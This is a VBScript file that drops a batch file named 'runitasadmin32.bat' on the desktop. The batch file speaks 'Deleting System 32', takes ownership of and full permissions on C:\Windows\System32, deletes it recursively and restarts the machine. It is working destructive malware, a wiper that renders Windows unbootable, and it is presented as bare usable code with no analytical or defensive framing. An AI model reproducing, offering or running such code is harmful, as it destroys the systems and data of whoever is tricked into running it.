Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

desktop = shell.SpecialFolders("Desktop")
folderPath = desktop & "\therealpart222323233232"

If Not fso.FolderExists(folderPath) Then
    fso.CreateFolder(folderPath)
End If

Set batFile = fso.CreateTextFile(folderPath & "\runitasadmin32.bat", True)

batFile.WriteLine "@echo off"
batFile.WriteLine "powershell -Command ""Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Deleting System 32. Goodbye.')"""
batFile.WriteLine "takeown /f C:\Windows\System32 /r /d y >nul"
batFile.WriteLine "icacls C:\Windows\System32 /grant %username%:F /t >nul"
batFile.WriteLine "rmdir /s /q C:\Windows\System32"
batFile.WriteLine "shutdown /r /t 5 /c ""System32 deleted. Restarting..."""
batFile.Close
